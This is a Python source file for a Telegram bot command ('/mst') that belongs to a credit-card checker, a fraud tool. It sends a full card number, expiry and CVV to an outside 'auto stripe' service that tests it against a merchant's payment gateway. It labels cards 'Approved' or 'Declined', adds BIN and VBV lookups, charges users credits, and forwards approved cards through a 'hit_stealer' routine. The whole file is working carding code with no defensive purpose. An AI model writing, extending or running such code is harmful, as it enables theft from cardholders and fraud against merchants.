import httpx
import time
import asyncio
import json
import re
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

async def chkr_api_check(fullcc: str, session: httpx.AsyncClient) -> dict:
    url = f"https://stripe-auto-dsam.onrender.com/gateway=autostripe/key=xebec/site=dilaboards.com/cc={fullcc}"
    try:
        resp = await session.get(url)
        json_resp = resp.json()
        status_raw = json_resp.get("status", "Unknown")
        message = json_resp.get("message", "").replace(" [GATE_01@chkr.cc]", "").strip()
        card_info = json_resp.get("card", {})

        if status_raw.lower() == "live":
            status = "Approved ✅"
        elif status_raw.lower() == "die":
            status = "Declined ❌"
        else:
            status = "Declined ❌"

        return {"status": status, "response": message, "card_info": card_info}
    except Exception as e:
        return {"status": "Api Down ⚠️", "response": str(e), "card_info": {}}

@Client.on_message(filters.command("mst", [".", "/"]))
async def chk_api_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        checkall = await check_all_thing(Client, message)

        gateway = "Auto stripe Premium Mass"

        if not checkall[0]:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        if not getcc:
            resp = f"""<b>
Gate Name: {gateway} ♻️
CMD: /mst

Message: No CC Found in your input ❌

Usage: /mst  cc|mes|ano|cvv</b>"""
            await message.reply_text(resp, message.id)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        bin6 = cc[:6]

        firstresp = f"""
↯ Checking.

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□
"""
        await asyncio.sleep(0.5)
        firstchk = await message.reply_text(firstresp, message.id)

        secondresp = f"""
↯ Checking..

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□
"""
        await asyncio.sleep(0.5)
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)

        start = time.perf_counter()
        async with httpx.AsyncClient(timeout=30, follow_redirects=True) as session:
            result = await chkr_api_check(fullcc, session)

        brand = "Unknown"
        type_ = "Unknown"
        level = "Unknown"
        bank = "Unknown"
        country = "Unknown"
        flag = "🌐"
        currency = "USD"

        card_data = result.get("card_info", {})
        if card_data:
            brand = card_data.get("brand", brand)
            type_ = card_data.get("type", type_)
            level = card_data.get("category", level)
            bank = card_data.get("bank", bank)
            country_info = card_data.get("country", {})
            country = country_info.get("name", country)
            flag = country_info.get("emoji", flag)
            currency = country_info.get("currency", currency)

        thirdresp = f"""
↯ Checking...

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■
"""
        await asyncio.sleep(0.5)
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)

        vbv_status = "Not Found"
        try:
            with open("FILES/vbvbin.txt", "r", encoding="utf-8") as file:
                vbv_data = file.readlines()
            bin_found = False
            for line in vbv_data:
                line = line.strip()
                if not line:
                    continue
                parts = line.split('|')
                if parts[0] == bin6:
                    bin_found = True
                    vbv_status = parts[2] if len(parts) > 2 else parts[1]
                    break
            if not bin_found:
                vbv_status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
        except FileNotFoundError:
            vbv_status = "VBV BIN file missing"

        proxy_status = "Live ✨"

        elapsed_time = time.perf_counter() - start

        finalresp = f"""
{result['status']}
━━━━━━━━━━━━━
[⟐] 𝗖𝗖 - <code>{fullcc}</code>
[⟐] 𝗦𝘁𝗮𝘁𝘂𝘀 : {result['response']}
[⟐] 𝗚𝗮𝘁𝗲 - {gateway}
━━━━━━━━━━━━━
[⟐] 𝗩𝗕𝗩 - {vbv_status}
━━━━━━━━━━━━━
[⟐] B𝗶𝗻 : {bin6}
[⟐] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country} {flag}
[⟐] 𝗜𝘀𝘀𝘂𝗲𝗿 : {bank}
[⟐] 𝗧𝘆𝗽𝗲 : {brand} | {type_} - {level}
━━━━━━━━━━━━━
[⟐] T/t : {elapsed_time:0.2f}s | Proxy : {proxy_status}
[⟐] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: <a href='tg://user?id={message.from_user.id}'> {message.from_user.first_name}</a> [ {role} ]
[⟐] 𝗢𝘄𝗻𝗲𝗿: <a href="tg://user?id=8340881349">𝑺𝑷𝑰𝑫𝑬𝑹</a>
╚═════⟐「 𝐒𝐏𝐘𝐃𝐄 𝐂𝐇𝐊  」⟐═════╝
"""
        await asyncio.sleep(0.5)
        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)

        await setantispamtime(user_id)
        await deductcredit(user_id)

        if result["status"] == "Approved ✅":
            await send_hit_if_approved(Client, finalresp)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())
        
